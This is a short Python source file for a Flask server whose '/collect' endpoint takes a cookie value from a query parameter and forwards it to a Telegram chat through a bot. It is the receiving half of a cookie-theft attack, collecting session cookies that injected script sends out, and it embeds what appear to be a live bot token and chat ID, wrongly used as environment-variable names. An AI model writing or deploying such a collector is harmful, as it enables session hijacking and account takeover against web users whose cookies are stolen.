import os
import threading
from flask import Flask, request
import telebot

BOT_TOKEN = os.environ.get("8726750443:AAEyVRTAaYLaKIn7vr0TT1gDuo8e8xjiGto")
CHAT_ID = os.environ.get("5560619845")
PORT = int(os.environ.get("PORT", 10000))

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

@app.route("/")
def index():
    return "ok"

@app.route("/collect")
def collect():
    cookie = request.args.get("c", "")
    if cookie:
        bot.send_message(CHAT_ID, f"Cookie:\n\n{cookie}")
        return "sent"
    return "no cookie"

def run_bot():
    bot.infinity_polling()

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host="0.0.0.0", port=PORT)